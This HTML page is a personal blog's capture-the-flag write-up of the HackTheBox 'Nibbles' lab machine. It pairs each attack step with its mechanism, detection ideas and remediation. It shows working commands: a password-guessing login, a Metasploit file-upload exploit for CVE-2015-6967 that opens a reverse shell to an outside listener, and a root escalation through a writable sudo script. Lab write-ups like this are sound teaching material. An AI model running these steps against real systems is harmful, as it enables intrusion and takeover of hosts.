@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nibbles — Writeup — Khalil Gueye</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #FFFFFF;
+    --bg-raise: #F4F6F9;
+    --panel: #FFFFFF;
+    --panel-border: #D5DCE5;
+    --text: #0B1F3A;
+    --text-dim: #4A5A70;
+    --text-faint: #8A97A8;
+    --accent: #1F4E79;
+    --accent-dim: #5A7CA0;
+    --green: #2E7D57;
+    --mono: 'IBM Plex Mono', ui-monospace, 'SF Mono', Consolas, monospace;
+    --sans: 'IBM Plex Sans', -apple-system, sans-serif;
+    --serif: 'IBM Plex Serif', Georgia, serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body{
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.65;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  a { color: inherit; text-decoration: none; }
+  ::selection { background: var(--accent); color: #fff; }
+  :focus-visible{ outline: 2px solid var(--accent); outline-offset: 3px; }
+
+  .wrap{ max-width: 820px; margin: 0 auto; padding: 0 32px; }
+
+  /* ---------- HEADER ---------- */
+  .site-head{
+    border-bottom: 1px solid var(--panel-border);
+    position: sticky; top: 0;
+    background: rgba(255,255,255,0.9);
+    backdrop-filter: blur(8px);
+    z-index: 50;
+  }
+  .site-head .inner{
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 20px 32px; max-width: 1020px; margin: 0 auto;
+  }
+  .brand{ display: flex; align-items: center; gap: 11px; font-weight: 600; font-size: 15px; letter-spacing: 0.01em; color: var(--text); }
+  .brand .mark{ width: 12px; height: 12px; background: var(--accent); flex-shrink: 0; border-radius: 1px; }
+  .site-nav{ display: flex; gap: 30px; }
+  .site-nav a{ font-size: 14.5px; color: var(--text-dim); font-weight: 500; transition: color 0.15s ease; }
+  .site-nav a:hover{ color: var(--accent); }
+  .site-nav a.current{ color: var(--text); }
+
+  /* ---------- HERO ---------- */
+  .case-hero{ padding: 56px 0 40px; }
+  .back{ font-family: var(--mono); font-size: 12.5px; color: var(--text-faint); display: inline-block; margin-bottom: 28px; transition: color 0.15s ease; }
+  .back:hover{ color: var(--accent); }
+  .case-hero h1{
+    font-family: var(--serif); font-weight: 600;
+    font-size: clamp(40px, 6.5vw, 62px); letter-spacing: -0.02em;
+    line-height: 1.02; color: var(--text);
+  }
+  .case-hero .subtitle{
+    margin-top: 18px; font-size: 17px; line-height: 1.7;
+    color: var(--text-dim); max-width: 60ch;
+  }
+
+  /* ---------- META STRIP ---------- */
+  .meta-strip{
+    display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px;
+    background: var(--panel-border); border: 1px solid var(--panel-border);
+    border-radius: 3px; overflow: hidden; margin-top: 32px;
+  }
+  .meta-cell{ background: var(--panel); padding: 14px 16px; }
+  .meta-cell .k{ font-family: var(--mono); font-size: 10px; letter-spacing: 0.06em; color: var(--text-faint); }
+  .meta-cell .v{ font-family: var(--mono); font-size: 13.5px; color: var(--text); margin-top: 5px; font-weight: 500; }
+  .meta-cell .v.easy{ color: var(--green); }
+  .meta-cell .v.medium{ color: var(--accent); }
+  .meta-cell .v.hard{ color: #B24A3E; }
+  .meta-cell .v.insane{ color: #6D4E9C; }
+  @media (max-width: 640px){ .meta-strip{ grid-template-columns: repeat(2, 1fr); } }
+
+  .attck-row{ margin-top: 16px; display: flex; flex-wrap: wrap; gap: 7px; align-items: center; }
+  .attck-row .lbl{ font-family: var(--mono); font-size: 10px; letter-spacing: 0.06em; color: var(--text-faint); margin-right: 4px; }
+  .chip{ font-family: var(--mono); font-size: 11px; padding: 3px 9px; border: 1px solid #BCD0E4; border-radius: 2px; color: var(--accent); background: #EEF3F9; }
+
+  /* ---------- ARTICLE ---------- */
+  .doc{ padding: 8px 0 24px; }
+  .doc section{ padding: 44px 0; border-top: 1px solid var(--panel-border); }
+
+  .sec-label{
+    font-family: var(--sans); font-weight: 600; font-size: 15px;
+    color: var(--text); margin-bottom: 20px;
+    display: flex; align-items: baseline; gap: 12px;
+  }
+  .sec-label .num{ font-family: var(--mono); font-size: 13px; color: var(--accent); font-weight: 600; }
+
+  .doc h2{ font-family: var(--serif); font-weight: 600; font-size: 24px; letter-spacing: -0.01em; margin-bottom: 16px; color: var(--text); }
+  .doc h3{ font-family: var(--sans); font-weight: 600; font-size: 16px; color: var(--text); margin: 26px 0 12px; }
+  .doc p{ margin: 0 0 16px; font-size: 16px; color: var(--text-dim); line-height: 1.72; }
+  .doc p strong{ color: var(--text); font-weight: 600; }
+  .doc ul{ margin: 0 0 16px 0; padding-left: 0; list-style: none; }
+  .doc ul li{ font-size: 15.5px; color: var(--text-dim); padding-left: 22px; position: relative; margin-bottom: 10px; line-height: 1.6; }
+  .doc ul li::before{ content: '—'; color: var(--accent-dim); position: absolute; left: 0; }
+  .doc ul li strong{ color: var(--text); }
+  .doc ol{ margin: 0 0 16px 0; padding-left: 22px; }
+  .doc ol li{ font-size: 15.5px; color: var(--text-dim); margin-bottom: 12px; line-height: 1.6; }
+  .doc ol li strong{ color: var(--text); }
+
+  code.inl{ font-family: var(--mono); font-size: 0.88em; background: var(--bg-raise); border: 1px solid var(--panel-border); border-radius: 3px; padding: 1px 5px; color: var(--accent); }
+
+  /* ---------- CODE / EVIDENCE BLOCKS ---------- */
+  .term{ background: var(--bg-raise); border: 1px solid var(--panel-border); border-radius: 5px; margin: 18px 0; overflow: hidden; }
+  .term-bar{ display: flex; align-items: center; gap: 8px; padding: 8px 14px; border-bottom: 1px solid var(--panel-border); font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.04em; color: var(--text-faint); }
+  .term-bar .d{ width: 8px; height: 8px; border-radius: 50%; background: #CBD4DF; }
+  .term-bar .d.a{ background: var(--accent-dim); }
+  .term pre{ margin: 0; padding: 14px 16px; overflow-x: auto; font-family: var(--mono); font-size: 13px; line-height: 1.55; color: var(--text); }
+  .term pre .p{ color: var(--accent); }
+  .term pre .c{ color: var(--text-faint); }
+
+  /* ---------- MECHANISM CALLOUT ---------- */
+  .mech{ border-left: 3px solid var(--accent); background: #EEF3F9; padding: 15px 18px; border-radius: 0 4px 4px 0; margin: 22px 0; }
+  .mech .lbl{ font-family: var(--mono); font-size: 11px; letter-spacing: 0.03em; color: var(--accent); font-weight: 600; display: block; margin-bottom: 6px; }
+  .mech p{ margin: 0; font-size: 15px; color: var(--text-dim); line-height: 1.65; }
+  .mech p strong{ color: var(--text); }
+
+  /* ---------- TABLES ---------- */
+  .tbl-scroll{ overflow-x: auto; margin: 20px 0; }
+  table{ width: 100%; border-collapse: collapse; font-size: 14px; min-width: 480px; }
+  th, td{ text-align: left; padding: 10px 14px; border: 1px solid var(--panel-border); vertical-align: top; }
+  th{ font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.04em; color: var(--text-dim); background: var(--bg-raise); font-weight: 600; }
+  td{ color: var(--text-dim); }
+  td .att{ font-family: var(--mono); font-size: 12px; color: var(--accent); }
+  td.num{ font-family: var(--mono); color: var(--text-faint); width: 34px; }
+
+  /* ---------- CLOSING ---------- */
+  .closing{ text-align: center; padding: 52px 0 !important; }
+  .closing .sig{ font-family: var(--mono); font-size: 13px; letter-spacing: 0.08em; color: var(--accent); margin-top: 22px; }
+
+  /* ---------- FOOTER ---------- */
+  .site-foot{ border-top: 1px solid var(--panel-border); padding: 28px 0 44px; }
+  .site-foot .inner{ display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; font-size: 13.5px; color: var(--text-faint); max-width: 1020px; margin: 0 auto; padding: 0 32px; }
+  .site-foot a{ color: var(--text-dim); font-weight: 500; }
+  .site-foot a:hover{ color: var(--accent); }
+  .site-foot .links{ display: flex; gap: 22px; }
+</style>
+</head>
+<body>
+
+<header class="site-head">
+  <div class="inner">
+    <a href="../index.html" class="brand"><span class="mark"></span>Khalil Gueye</a>
+    <nav class="site-nav">
+      <a href="index.html" class="current">Writeups</a>
+      <a href="../portfolio/">Portfolio</a>
+      <a href="../videos/">Videos</a>
+    </nav>
+  </div>
+</header>
+
+<section class="case-hero wrap">
+  <a href="index.html" class="back">← Writeups</a>
+  <h1>Nibbles</h1>
+  <p class="subtitle">A default Apache page hides a vulnerable blogging CMS, a reused weak password, and a world-writable sudo script — three small mistakes that chain into full root.</p>
+
+  <div class="meta-strip">
+    <div class="meta-cell"><div class="k">Target</div><div class="v">10.10.10.75</div></div>
+    <div class="meta-cell"><div class="k">Platform</div><div class="v">Linux</div></div>
+    <div class="meta-cell"><div class="k">Difficulty</div><div class="v easy">Easy</div></div>
+    <div class="meta-cell"><div class="k">Root cause</div><div class="v">Chained</div></div>
+  </div>
+  <div class="attck-row">
+    <span class="lbl">ATT&amp;CK</span>
+    <span class="chip">T1595</span>
+    <span class="chip">T1190</span>
+    <span class="chip">T1110</span>
+    <span class="chip">T1059.004</span>
+    <span class="chip">T1548.003</span>
+  </div>
+</section>
+
+<article class="doc wrap">
+<section>
+  <div class="sec-label"><span class="num">00</span> Why this box matters</div>
+  <p>Nibbles is rated <strong>Easy</strong>, but the chain behind it is a near-perfect miniature of how real breaches happen: a forgotten or under-documented web application exposed on a production host, an admin account protected by a weak/guessable password, and a sudo rule that trusts a file the low-privilege user can edit. None of these individually requires deep exploit-dev skill — the danger is that <strong>each one is common in real environments</strong>, and stacked together they hand over the entire box.</p>
+  <p>The lesson for defenders isn't "patch this CVE." It's: audit what's actually reachable on port 80, rotate default/weak CMS credentials, and never let <code class="inl">sudo</code> trust a script whose ownership or permissions an attacker-controlled user can influence.</p>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">01</span> Recon</div>
+  <h2>Port scan</h2>
+  <p>Standard full TCP sweep first, since Easy boxes on HTB rarely hide services outside the obvious two.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;nmap</div>
+<pre><span class="p">$</span> nmap -sC -sV -p- -T4 10.10.10.75
+<span class="c"># trimmed</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)</pre>
+  </div>
+  <p>Two services: SSH and a default-looking Apache install. The interesting surface is HTTP.</p>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">02</span> Web enumeration</div>
+  <h2>The default page is a decoy</h2>
+  <p>Visiting the root of the site shows the stock Apache2 Ubuntu Default Page — nothing to exploit there directly. But default pages are frequently left in place <em>on top of</em> a real application sitting in a subdirectory. Checking the HTML source and <code class="inl">robots.txt</code> both pay off here.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;enum</div>
+<pre><span class="p">$</span> curl -s http://10.10.10.75/ | grep -i nibble
+&lt;!-- /nibbleblog/ --&gt;
+
+<span class="p">$</span> curl -s http://10.10.10.75/robots.txt
+User-agent: *
+Disallow: /nibbleblog/admin.php
+Disallow: /nibbleblog/README.md</pre>
+  </div>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>This is plain <strong>information disclosure via developer artifacts</strong>: an HTML comment and a <code class="inl">robots.txt</code> entry both leak the existence of a hidden path that was never meant to be advertised to unauthenticated visitors. Search engines are told not to index it, but nothing stops a human (or a scanner) from just requesting it directly — <code class="inl">robots.txt</code> is a request, not an access control.</p>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">03</span> Identifying the CMS and its CVE</div>
+  <p>Browsing to <code class="inl">/nibbleblog/</code> reveals a working blog install: <strong>Nibbleblog</strong>, a lightweight PHP CMS. The footer/README discloses the version — 4.0.3, a build with a known, publicly documented vulnerability.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;searchsploit</div>
+<pre><span class="p">$</span> searchsploit nibbleblog
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                |  Path
+------------------------------------------------------------ ---------------------------------
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)         | php/webapps/38489.rb
+------------------------------------------------------------ ---------------------------------</pre>
+  </div>
+  <p>This corresponds to <strong>CVE-2015-6967</strong>: the <code class="inl">My Image</code> plugin, used to attach a header image to a blog, accepts uploaded files without validating their actual content type — only trusting the file extension check on the client side. An authenticated admin can therefore upload a PHP file disguised as an image and get it stored inside a web-reachable directory.</p>
+  <p>Crucially, this vulnerability requires <strong>authenticated admin access</strong> to the CMS. That's the next gap to close.</p>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">04</span> Credential access</div>
+  <p>Nibbleblog's admin panel sits at <code class="inl">/nibbleblog/admin.php</code>. Rather than brute-forcing blindly, a small guess based on the box's naming theme is worth trying first — a habit that pays off surprisingly often against CTF-style targets and, worryingly, against real organizations that reuse a branded or thematic password across systems.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;login</div>
+<pre><span class="p">$</span> curl -s -i http://10.10.10.75/nibbleblog/admin.php \
+    -d "username=admin&amp;password=nibbles"
+<span class="c"># 302 redirect to admin/index.php -> valid session cookie set</span></pre>
+  </div>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>This is <strong>weak/guessable credential reuse (T1110/T1078 territory)</strong> — no rate-limiting, no account lockout, no MFA on the admin login. A single low-entropy password themed after the application name was enough. In production, this is exactly the class of finding that shows up in every credential-stuffing and password-spray postmortem.</p>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">05</span> Exploitation — arbitrary file upload to RCE</div>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>The <code class="inl">My Image</code> plugin's upload handler checks the file's declared MIME type / extension but never inspects or re-validates the actual bytes, and the upload directory is directly served by Apache with PHP execution enabled. Upload a file named with a benign image extension but containing a PHP payload (or simply a <code class="inl">.php</code> file if the extension filter is bypassable), request it directly, and the web server executes it as PHP. This is a textbook <strong>unrestricted file upload leading to remote code execution</strong> — CWE-434.</p>
+  </div>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;msfconsole</div>
+<pre><span class="p">$</span> msfconsole -q
+msf6 &gt; use exploit/multi/http/nibbleblog_file_upload
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set RHOSTS 10.10.10.75
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set TARGETURI /nibbleblog/
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set USERNAME admin
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set PASSWORD nibbles
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set LHOST 10.10.14.5
+msf6 exploit(multi/http/nibbleblog_file_upload) &gt; run
+
+<span class="c">[*] Started reverse TCP handler on 10.10.14.5:4444</span>
+<span class="c">[*] Uploading payload...</span>
+<span class="c">[*] Meterpreter session 1 opened</span>
+
+meterpreter &gt; shell
+$ id
+uid=1000(nibbler) gid=1000(nibbler) groups=1000(nibbler)</pre>
+  </div>
+  <p>Foothold obtained as the local user <code class="inl">nibbler</code> — the same account the Apache/PHP-FPM worker runs as on this box, which is itself a misconfiguration (web workers should run as a dedicated unprivileged service account, not a real interactive user).</p>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">06</span> Privilege escalation — sudo trusting a writable script</div>
+  <p>Standard privesc triage starts with checking what the current user is allowed to run as root.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;sudo -l</div>
+<pre><span class="p">$</span> sudo -l
+Matching Defaults entries for nibbler on nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+<span class="p">$</span> ls -la /home/nibbler/personal/stuff/monitor.sh
+-rwxr--r-- 1 nibbler nibbler 0 Jan  1 00:00 monitor.sh</pre>
+  </div>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>The sudoers rule allows <code class="inl">nibbler</code> to execute a specific script as root with no password prompt — a common and reasonable-looking pattern for delegating a monitoring task. The fatal flaw is that the script itself lives under <code class="inl">/home/nibbler/</code> and is <strong>owned and writable by the same user it's granted to run as root</strong>. Sudo only checks the path in its policy; it does not verify the file's integrity, ownership immutability, or that it hasn't been altered since the rule was written. Whoever controls the file controls what root executes — this is <strong>abuse of sudo/sudo caching (T1548.003)</strong> via a mutable trusted binary.</p>
+  </div>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;root</div>
+<pre><span class="p">$</span> echo -e '#!/bin/bash\n/bin/bash -p' &gt; /home/nibbler/personal/stuff/monitor.sh
+<span class="p">$</span> sudo /home/nibbler/personal/stuff/monitor.sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+[REDACTED — grab your own]</pre>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">07</span> Detection</div>
+  <ul>
+    <li><strong>Web layer:</strong> alert on POST requests to CMS admin/login endpoints with high request rates from a single source (credential guessing/spraying), and on file uploads that land executable extensions (<code class="inl">.php</code>, <code class="inl">.phtml</code>) inside directories intended for media.</li>
+    <li><strong>Process/EDR layer:</strong> a PHP-FPM or Apache worker process spawning <code class="inl">/bin/bash</code> or a reverse shell is a high-fidelity indicator of webshell execution — CMS worker processes should almost never fork interactive shells.</li>
+    <li><strong>Host layer:</strong> audit (<code class="inl">auditd</code>/<code class="inl">execve</code> logging) of every <code class="inl">sudo</code> invocation, especially against scripts outside <code class="inl">/usr/bin</code> or <code class="inl">/usr/local</code>. A sudo rule pointing at a path under a normal user's home directory should itself trip a config-drift alert.</li>
+    <li><strong>File integrity monitoring (FIM):</strong> any modification to a script referenced by a NOPASSWD sudoers entry should generate an immediate alert — this is exactly the artifact that was silently rewritten in this attack.</li>
+  </ul>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">08</span> Remediation</div>
+  <ol>
+    <li><strong>Patch/replace the CMS.</strong> Nibbleblog 4.0.3 is EOL and carries a known unauthenticated-adjacent RCE path; upgrade or migrate off it, and validate all file uploads server-side by content inspection (magic bytes / re-encoding), never by extension or client-supplied MIME type alone.</li>
+    <li><strong>Remove exposure of hidden paths.</strong> Don't rely on <code class="inl">robots.txt</code> or obscurity to hide admin panels — put them behind network-level restrictions (VPN/allowlist) or at minimum strong authentication with rate limiting and MFA.</li>
+    <li><strong>Enforce credential hygiene.</strong> Ban default/thematic/dictionary passwords on CMS admin accounts; integrate with a password policy or SSO rather than local app auth.</li>
+    <li><strong>Run web workers as a dedicated low-privilege service account</strong> distinct from any real login user, with a restrictive shell and no home directory writable by the web app.</li>
+    <li><strong>Harden sudoers.</strong> Never grant NOPASSWD execution of a script that lives in a path writable by the grantee. Store privileged scripts under root-owned, mode <code class="inl">750</code> directories (e.g. <code class="inl">/usr/local/sbin</code>), owned by root, and reference them by absolute path with integrity pinning (checksum validation, or use <code class="inl">sudo</code>'s <code class="inl">command</code> matching plus immutable attribute <code class="inl">chattr +i</code> where feasible).</li>
+  </ol>
+</section>
+
+<div class="tbl-scroll">
+  <table>
+    <thead><tr><th>#</th><th>Action</th><th>ATT&amp;CK</th></tr></thead>
+    <tbody>
+      <tr><td class="num">1</td><td>Port scan reveals SSH + Apache</td><td><span class="att">T1595</span></td></tr>
+      <tr><td class="num">2</td><td>HTML comment / robots.txt leak hidden /nibbleblog/ path</td><td><span class="att">T1595</span></td></tr>
+      <tr><td class="num">3</td><td>Weak admin password guessed against Nibbleblog login</td><td><span class="att">T1110</span></td></tr>
+      <tr><td class="num">4</td><td>My Image plugin arbitrary file upload (CVE-2015-6967) to webshell</td><td><span class="att">T1190</span></td></tr>
+      <tr><td class="num">5</td><td>Reverse shell execution as user nibbler</td><td><span class="att">T1059.004</span></td></tr>
+      <tr><td class="num">6</td><td>Overwrite sudo-trusted, user-writable monitor.sh to spawn root shell</td><td><span class="att">T1548.003</span></td></tr>
+    </tbody>
+  </table>
+</div>
+
+<section class="closing">
+  <p>Nibbles is a reminder that "easy" boxes are easy technically, not conceptually — the underlying weaknesses (leaked hidden paths, weak passwords, unrestricted uploads, and sudo rules that trust mutable files) are exactly what shows up in real breach reports every year. Each fix here is cheap; the cost only shows up when they're skipped.</p>
+  <div class="sig">build it · break it · catch it</div>
+</section>
+</article>
+
+<footer class="site-foot">
+  <div class="inner">
+    <span>© 2026 Khalil Gueye — Raleigh, NC</span>
+    <span class="links">
+      <a href="https://github.com/khalilsgueye" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://youtube.com/@khalilgueye10" target="_blank" rel="noopener">YouTube</a>
+      <a href="https://twitter.com/khalilgueye10" target="_blank" rel="noopener">X</a>
+    </span>
+  </div>
+</footer>
+
+</body>
+</html>
